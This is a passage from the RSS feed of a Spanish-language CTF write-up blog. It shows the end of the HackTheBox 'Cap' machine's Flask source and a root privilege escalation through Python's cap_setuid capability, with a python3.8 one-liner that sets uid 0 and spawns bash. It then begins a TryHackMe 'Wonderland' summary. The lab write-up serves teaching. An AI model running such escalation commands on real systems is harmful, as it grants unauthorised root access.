  &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;popen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ifconfig&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rawtext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/netstat&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;netstat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;popen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;netstat -aneop&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rawtext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;data.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/data/&amp;lt;id&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;data_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process_pcap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
              &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;nd&#34;&gt;@app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/download/&amp;lt;id&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;download&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_from_directory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.pcap&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_attachment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.0.0.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;b524fd8b4c4dcead\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;p&gt;Realizamos una enumeracion de las &lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;capabilities&lt;/a&gt;, vemos que python se lista con la capability cap_setuid lo que nos permitiria obtener acceso privilegiado el cual utilizamos para ejecutar bash (&lt;a href=&#34;https://gtfobins.github.io/gtfobins/python/#capabilities&#34;&gt;GTFOBins - Python&lt;/a&gt;) , logrando obtener acceso como root y leer la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nathan@cap:~$ getcap -r / 2&amp;gt;/dev/null
/usr/bin/python3.8 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip
/usr/bin/ping &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
/usr/bin/traceroute6.iputils &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
/usr/bin/mtr-packet &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$ python3.8 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
root@cap:~# whoami
root
root@cap:~# ls
user.txt
root@cap:~# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
root@cap:~# ls
user.txt
root@cap:~# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt
f5fbfb8a01d451fdb4a27fdb09d1f7c4
root@cap:/root# who
nathan   pts/0        2021-06-05 19:27 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.14.25&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@cap:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/cap/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/cap/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>python</category>
            
          
            
              <category>wireshark</category>
            
          
            
              <category>ftp</category>
            
          
            
              <category>capabilities</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Wonderland</title>
        <link>https://sckull.github.io/posts/wonderland/</link>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 01 Sep 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/wonderland/</guid>
        <description>Wonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Wonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista. Tras enumerar la pagina web encontramos credenciales para acceder por SSH. Cambiamos a un segundo usuario modificando un script para realizar Python Library Hijacking. Modificando la variable PATH conseguimos una shell al siguiente usuario. Finalmente con las Capabilities de Perl obtuvimos acceso como root.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/wonderland&#34;&gt;Wonderland&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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